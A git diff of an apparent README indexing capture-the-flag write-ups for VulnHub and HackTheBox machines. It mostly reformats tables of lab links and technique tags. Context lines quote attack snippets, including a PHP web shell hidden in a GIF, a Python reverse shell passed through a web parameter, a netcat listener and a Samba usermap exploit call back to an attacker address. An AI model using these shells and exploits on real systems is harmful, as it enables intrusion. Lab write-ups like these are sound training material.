-| 1. | 09/Oct/2019 | [Kioptrix: 2014 (#5)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix5/writeup.pdf) |  | [`exploit_pchart`](https://github.com/7h3rAm/writeups#exploit_pchart), [`exploit_phptax`](https://github.com/7h3rAm/writeups#exploit_phptax), [`privesc_freebsd`](https://github.com/7h3rAm/writeups#privesc_freebsd) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix5/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Kioptrix: 2014 (#5)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix5/writeup.pdf) | [vulnhub#62](https://www.vulnhub.com/entry/kioptrix-2014-5,62/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix5/killchain.png" width="100" height="100" /> | [`exploit_pchart`](https://github.com/7h3rAm/writeups#exploit_pchart), [`exploit_phptax`](https://github.com/7h3rAm/writeups#exploit_phptax), [`privesc_freebsd`](https://github.com/7h3rAm/writeups#privesc_freebsd) |
   
 [+] https://www.exploit-db.com/exploits/31173  
 [+] https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/zpanel_information_disclosure_rce.rb  
@@ -1331,11 +1331,11 @@ nc -nlvp <attackerport>
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 27/Sep/2019 | [hackme: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.hackme/writeup.pdf) |  | [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.hackme/killchain.png" width="100" height="100" /> |
-| 2. | 19/Sep/2019 | [hackfest2016: Sedna](https://github.com/7h3rAm/writeups/blob/master/vulnhub.sedna/writeup.pdf) |  | [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_chkrootkit`](https://github.com/7h3rAm/writeups#privesc_chkrootkit), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_bash_reverseshell`](https://github.com/7h3rAm/writeups#privesc_bash_reverseshell) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.sedna/killchain.png" width="100" height="100" /> |
-| 3. | 11/Sep/2019 | [FristiLeaks: 1.3](https://github.com/7h3rAm/writeups/blob/master/vulnhub.fristileaks1dot3/writeup.pdf) |  | [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_fileupload_bypass`](https://github.com/7h3rAm/writeups#exploit_php_fileupload_bypass), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.fristileaks1dot3/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [hackme: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.hackme/writeup.pdf) | [vulnhub#330](https://www.vulnhub.com/entry/hackme-1,330/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.hackme/killchain.png" width="100" height="100" /> | [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) |
+| 2. | [hackfest2016: Sedna](https://github.com/7h3rAm/writeups/blob/master/vulnhub.sedna/writeup.pdf) | [vulnhub#181](https://www.vulnhub.com/entry/hackfest2016-sedna,181/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.sedna/killchain.png" width="100" height="100" /> | [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_chkrootkit`](https://github.com/7h3rAm/writeups#privesc_chkrootkit), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_bash_reverseshell`](https://github.com/7h3rAm/writeups#privesc_bash_reverseshell) |
+| 3. | [FristiLeaks: 1.3](https://github.com/7h3rAm/writeups/blob/master/vulnhub.fristileaks1dot3/writeup.pdf) | [vulnhub#133](https://www.vulnhub.com/entry/fristileaks-13,133/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.fristileaks1dot3/killchain.png" width="100" height="100" /> | [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_fileupload_bypass`](https://github.com/7h3rAm/writeups#exploit_php_fileupload_bypass), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) |
   
   
 ---
@@ -1353,10 +1353,10 @@ echo -e 'GIF89a\n<?php $out=$_GET["cmd"]; echo `$out`; ?>' >cmd.gif
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 26/Sep/2019 | [IMF: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.imf/writeup.pdf) |  | [`exploit_php_fileupload_bypass`](https://github.com/7h3rAm/writeups#exploit_php_fileupload_bypass), [`privesc_bof`](https://github.com/7h3rAm/writeups#privesc_bof) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.imf/killchain.png" width="100" height="100" /> |
-| 2. | 11/Sep/2019 | [FristiLeaks: 1.3](https://github.com/7h3rAm/writeups/blob/master/vulnhub.fristileaks1dot3/writeup.pdf) |  | [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_fileupload_bypass`](https://github.com/7h3rAm/writeups#exploit_php_fileupload_bypass), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.fristileaks1dot3/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [IMF: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.imf/writeup.pdf) | [vulnhub#162](https://www.vulnhub.com/entry/imf-1,162/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.imf/killchain.png" width="100" height="100" /> | [`exploit_php_fileupload_bypass`](https://github.com/7h3rAm/writeups#exploit_php_fileupload_bypass), [`privesc_bof`](https://github.com/7h3rAm/writeups#privesc_bof) |
+| 2. | [FristiLeaks: 1.3](https://github.com/7h3rAm/writeups/blob/master/vulnhub.fristileaks1dot3/writeup.pdf) | [vulnhub#133](https://www.vulnhub.com/entry/fristileaks-13,133/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.fristileaks1dot3/killchain.png" width="100" height="100" /> | [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_fileupload_bypass`](https://github.com/7h3rAm/writeups#exploit_php_fileupload_bypass), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) |
   
   
 ---
@@ -1364,14 +1364,14 @@ echo -e 'GIF89a\n<?php $out=$_GET["cmd"]; echo `$out`; ?>' >cmd.gif
 #### exploit_php_reverseshell [⇡](#exploit)  
 use php reverse shell code with an exploit to gain interactive access on the target system  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 29/Oct/2019 | [LazySysAdmin: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/writeup.pdf) |  | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_smb_nullsession`](https://github.com/7h3rAm/writeups#exploit_smb_nullsession), [`exploit_smb_web_root`](https://github.com/7h3rAm/writeups#exploit_smb_web_root), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_wordpress_template`](https://github.com/7h3rAm/writeups#exploit_wordpress_template), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/killchain.png" width="100" height="100" /> |
-| 2. | 21/Oct/2019 | [Mr-Robot: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.mrrobot1/writeup.pdf) |  | [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid), [`privesc_nmap`](https://github.com/7h3rAm/writeups#privesc_nmap) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.mrrobot1/killchain.png" width="100" height="100" /> |
-| 3. | 27/Sep/2019 | [hackme: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.hackme/writeup.pdf) |  | [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.hackme/killchain.png" width="100" height="100" /> |
-| 4. | 19/Sep/2019 | [hackfest2016: Sedna](https://github.com/7h3rAm/writeups/blob/master/vulnhub.sedna/writeup.pdf) |  | [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_chkrootkit`](https://github.com/7h3rAm/writeups#privesc_chkrootkit), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_bash_reverseshell`](https://github.com/7h3rAm/writeups#privesc_bash_reverseshell) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.sedna/killchain.png" width="100" height="100" /> |
-| 5. | 18/Sep/2019 | [hackfest2016: Quaoar](https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/writeup.pdf) |  | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_defaultcreds`](https://github.com/7h3rAm/writeups#exploit_wordpress_defaultcreds), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_credsreuse`](https://github.com/7h3rAm/writeups#privesc_credsreuse) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/killchain.png" width="100" height="100" /> |
-| 6. | 09/Sep/2019 | [BSides Vancouver: 2018 (Workshop)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf) |  | [`enumerate_proto_ftp`](https://github.com/7h3rAm/writeups#enumerate_proto_ftp), [`enumerate_proto_ssh`](https://github.com/7h3rAm/writeups#enumerate_proto_ssh), [`exploit_ssh_bruteforce`](https://github.com/7h3rAm/writeups#exploit_ssh_bruteforce), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [LazySysAdmin: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/writeup.pdf) | [vulnhub#205](https://www.vulnhub.com/entry/lazysysadmin-1,205/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_smb_nullsession`](https://github.com/7h3rAm/writeups#exploit_smb_nullsession), [`exploit_smb_web_root`](https://github.com/7h3rAm/writeups#exploit_smb_web_root), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_wordpress_template`](https://github.com/7h3rAm/writeups#exploit_wordpress_template), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) |
+| 2. | [Mr-Robot: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.mrrobot1/writeup.pdf) | [vulnhub#151](https://www.vulnhub.com/entry/mr-robot-1,151/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.mrrobot1/killchain.png" width="100" height="100" /> | [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid), [`privesc_nmap`](https://github.com/7h3rAm/writeups#privesc_nmap) |
+| 3. | [hackme: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.hackme/writeup.pdf) | [vulnhub#330](https://www.vulnhub.com/entry/hackme-1,330/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.hackme/killchain.png" width="100" height="100" /> | [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) |
+| 4. | [hackfest2016: Sedna](https://github.com/7h3rAm/writeups/blob/master/vulnhub.sedna/writeup.pdf) | [vulnhub#181](https://www.vulnhub.com/entry/hackfest2016-sedna,181/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.sedna/killchain.png" width="100" height="100" /> | [`exploit_php_fileupload`](https://github.com/7h3rAm/writeups#exploit_php_fileupload), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_chkrootkit`](https://github.com/7h3rAm/writeups#privesc_chkrootkit), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_bash_reverseshell`](https://github.com/7h3rAm/writeups#privesc_bash_reverseshell) |
+| 5. | [hackfest2016: Quaoar](https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/writeup.pdf) | [vulnhub#180](https://www.vulnhub.com/entry/hackfest2016-quaoar,180/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_defaultcreds`](https://github.com/7h3rAm/writeups#exploit_wordpress_defaultcreds), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_credsreuse`](https://github.com/7h3rAm/writeups#privesc_credsreuse) |
+| 6. | [BSides Vancouver: 2018 (Workshop)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf) | [vulnhub#231](https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/killchain.png" width="100" height="100" /> | [`enumerate_proto_ftp`](https://github.com/7h3rAm/writeups#enumerate_proto_ftp), [`enumerate_proto_ssh`](https://github.com/7h3rAm/writeups#enumerate_proto_ssh), [`exploit_ssh_bruteforce`](https://github.com/7h3rAm/writeups#exploit_ssh_bruteforce), [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_wordpress_plugin_hellodolly`](https://github.com/7h3rAm/writeups#exploit_wordpress_plugin_hellodolly), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`privesc_cron`](https://github.com/7h3rAm/writeups#privesc_cron), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
   
   
 ---
@@ -1379,9 +1379,9 @@ use php reverse shell code with an exploit to gain interactive access on the tar
 #### exploit_php_webshell [⇡](#exploit)  
 use the php web shell to execute arbitrary commands and gain interactive access on the target system  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 11/Oct/2019 | [Misdirection: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.misdirection1/writeup.pdf) |  | [`exploit_php_webshell`](https://github.com/7h3rAm/writeups#exploit_php_webshell), [`exploit_bash_reverseshell`](https://github.com/7h3rAm/writeups#exploit_bash_reverseshell), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers), [`privesc_passwd_writable`](https://github.com/7h3rAm/writeups#privesc_passwd_writable) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.misdirection1/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Misdirection: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.misdirection1/writeup.pdf) | [vulnhub#371](https://www.vulnhub.com/entry/misdirection-1,371/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.misdirection1/killchain.png" width="100" height="100" /> | [`exploit_php_webshell`](https://github.com/7h3rAm/writeups#exploit_php_webshell), [`exploit_bash_reverseshell`](https://github.com/7h3rAm/writeups#exploit_bash_reverseshell), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers), [`privesc_passwd_writable`](https://github.com/7h3rAm/writeups#privesc_passwd_writable) |
   
   
 ---
@@ -1397,9 +1397,9 @@ GET /phptax/data/rce.php?cmd=uname%20-a HTTP/1.1
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 09/Oct/2019 | [Kioptrix: 2014 (#5)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix5/writeup.pdf) |  | [`exploit_pchart`](https://github.com/7h3rAm/writeups#exploit_pchart), [`exploit_phptax`](https://github.com/7h3rAm/writeups#exploit_phptax), [`privesc_freebsd`](https://github.com/7h3rAm/writeups#privesc_freebsd) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix5/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Kioptrix: 2014 (#5)](https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix5/writeup.pdf) | [vulnhub#62](https://www.vulnhub.com/entry/kioptrix-2014-5,62/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix5/killchain.png" width="100" height="100" /> | [`exploit_pchart`](https://github.com/7h3rAm/writeups#exploit_pchart), [`exploit_phptax`](https://github.com/7h3rAm/writeups#exploit_phptax), [`privesc_freebsd`](https://github.com/7h3rAm/writeups#privesc_freebsd) |
   
 [+] https://www.exploit-db.com/exploits/25849  
   
@@ -1438,10 +1438,10 @@ http://<targetip>/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 25/Jun/2020 | [Bashed](https://github.com/7h3rAm/writeups/blob/master/htb.bashed/writeup.pdf) |  | [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`exploit_python_reverseshell`](https://github.com/7h3rAm/writeups#exploit_python_reverseshell), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_cron_rootjobs`](https://github.com/7h3rAm/writeups#privesc_cron_rootjobs) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.bashed/killchain.png" width="100" height="100" /> |
-| 2. | 17/Sep/2019 | [Escalate_Linux: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.escalatelinux/writeup.pdf) |  | [`exploit_python_reverseshell`](https://github.com/7h3rAm/writeups#exploit_python_reverseshell), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.escalatelinux/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Bashed](https://github.com/7h3rAm/writeups/blob/master/htb.bashed/writeup.pdf) | [hackthebox#118](https://www.hackthebox.eu/home/machines/profile/118) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.bashed/killchain.png" width="100" height="100" /> | [`enumerate_proto_http`](https://github.com/7h3rAm/writeups#enumerate_proto_http), [`exploit_python_reverseshell`](https://github.com/7h3rAm/writeups#exploit_python_reverseshell), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo), [`privesc_cron_rootjobs`](https://github.com/7h3rAm/writeups#privesc_cron_rootjobs) |
+| 2. | [Escalate_Linux: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.escalatelinux/writeup.pdf) | [vulnhub#323](https://www.vulnhub.com/entry/escalate_linux-1,323/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.escalatelinux/killchain.png" width="100" height="100" /> | [`exploit_python_reverseshell`](https://github.com/7h3rAm/writeups#exploit_python_reverseshell), [`privesc_mysql_creds`](https://github.com/7h3rAm/writeups#privesc_mysql_creds), [`privesc_setuid`](https://github.com/7h3rAm/writeups#privesc_setuid) |
   
 [+] http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet  
 [+] https://highon.coffee/blog/reverse-shell-cheat-sheet/#python-reverse-shell  
@@ -1455,9 +1455,9 @@ nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls <tar
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 13/Nov/2019 | [Shocker](https://github.com/7h3rAm/writeups/blob/master/htb.shocker/writeup.pdf) |  | [`exploit_shellshock`](https://github.com/7h3rAm/writeups#exploit_shellshock), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.shocker/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Shocker](https://github.com/7h3rAm/writeups/blob/master/htb.shocker/writeup.pdf) | [hackthebox#108](https://www.hackthebox.eu/home/machines/profile/108) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.shocker/killchain.png" width="100" height="100" /> | [`exploit_shellshock`](https://github.com/7h3rAm/writeups#exploit_shellshock), [`privesc_sudoers`](https://github.com/7h3rAm/writeups#privesc_sudoers) |
   
 [+] https://zayotic.com/posts/oscp-reference/  
 [+] https://highon.coffee/blog/shellshock-pen-testers-lab-walkthrough/  
@@ -1488,9 +1488,9 @@ msf:
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 01/Nov/2019 | [Legacy](https://github.com/7h3rAm/writeups/blob/master/htb.legacy/writeup.pdf) |  | [`exploit_smb_ms08_067`](https://github.com/7h3rAm/writeups#exploit_smb_ms08_067) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.legacy/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Legacy](https://github.com/7h3rAm/writeups/blob/master/htb.legacy/writeup.pdf) | [hackthebox#2](https://www.hackthebox.eu/home/machines/profile/2) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.legacy/killchain.png" width="100" height="100" /> | [`exploit_smb_ms08_067`](https://github.com/7h3rAm/writeups#exploit_smb_ms08_067) |
   
 [+] https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2008/ms08-067  
 [+] https://github.com/andyacer/ms08_067  
@@ -1518,9 +1518,9 @@ msf:
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 01/Nov/2019 | [Blue](https://github.com/7h3rAm/writeups/blob/master/htb.blue/writeup.pdf) |  | [`exploit_smb_ms17_010`](https://github.com/7h3rAm/writeups#exploit_smb_ms17_010) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.blue/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Blue](https://github.com/7h3rAm/writeups/blob/master/htb.blue/writeup.pdf) | [hackthebox#51](https://www.hackthebox.eu/home/machines/profile/51) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.blue/killchain.png" width="100" height="100" /> | [`exploit_smb_ms17_010`](https://github.com/7h3rAm/writeups#exploit_smb_ms17_010) |
   
 [+] https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010  
 [+] https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue  
@@ -1532,9 +1532,9 @@ msf:
 #### exploit_smb_nullsession [⇡](#exploit)  
 smb null sessions leak a lot of sensitive information about the target system. it could be useful to access open shares or to get sensitive information  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 29/Oct/2019 | [LazySysAdmin: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/writeup.pdf) |  | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_smb_nullsession`](https://github.com/7h3rAm/writeups#exploit_smb_nullsession), [`exploit_smb_web_root`](https://github.com/7h3rAm/writeups#exploit_smb_web_root), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_wordpress_template`](https://github.com/7h3rAm/writeups#exploit_wordpress_template), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [LazySysAdmin: 1](https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/writeup.pdf) | [vulnhub#205](https://www.vulnhub.com/entry/lazysysadmin-1,205/) | <img src="https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/killchain.png" width="100" height="100" /> | [`enumerate_app_wordpress`](https://github.com/7h3rAm/writeups#enumerate_app_wordpress), [`exploit_smb_nullsession`](https://github.com/7h3rAm/writeups#exploit_smb_nullsession), [`exploit_smb_web_root`](https://github.com/7h3rAm/writeups#exploit_smb_web_root), [`exploit_php_reverseshell`](https://github.com/7h3rAm/writeups#exploit_php_reverseshell), [`exploit_credsreuse`](https://github.com/7h3rAm/writeups#exploit_credsreuse), [`exploit_wordpress_template`](https://github.com/7h3rAm/writeups#exploit_wordpress_template), [`privesc_sudo`](https://github.com/7h3rAm/writeups#privesc_sudo) |
   
   
 ---
@@ -1551,9 +1551,9 @@ python usermap_script.py <targetip> 139 <attackerip> <attackerport>
 
 ```
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
-| 1. | 01/Nov/2019 | [Lame](https://github.com/7h3rAm/writeups/blob/master/htb.lame/writeup.pdf) |  | [`exploit_smb_usermap`](https://github.com/7h3rAm/writeups#exploit_smb_usermap) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.lame/killchain.png" width="100" height="100" /> |
+| # | Name | Infra | Killchain | TTPs |
+|---|------|-------|-----------|------|
+| 1. | [Lame](https://github.com/7h3rAm/writeups/blob/master/htb.lame/writeup.pdf) | [hackthebox#1](https://www.hackthebox.eu/home/machines/profile/1) | <img src="https://github.com/7h3rAm/writeups/blob/master/htb.lame/killchain.png" width="100" height="100" /> | [`exploit_smb_usermap`](https://github.com/7h3rAm/writeups#exploit_smb_usermap) |
   
 [+] https://nvd.nist.gov/vuln/detail/CVE-2007-2447  
 [+] https://github.com/amriunix/CVE-2007-2447  
@@ -1563,9 +1563,9 @@ python usermap_script.py <targetip> 139 <attackerip> <attackerport>
 #### exploit_smb_web_root [⇡](#exploit)  
 smb shared directory is mapped to the web server's root directory. read files to obtain sensitive information or upload a reverse shell file native to the web server and trigger it's execution to gain interactive access on the target system  
   
-| # | Date | Name | Categories | Tags | Overview |
-|---|------|------|------------|------|----------|
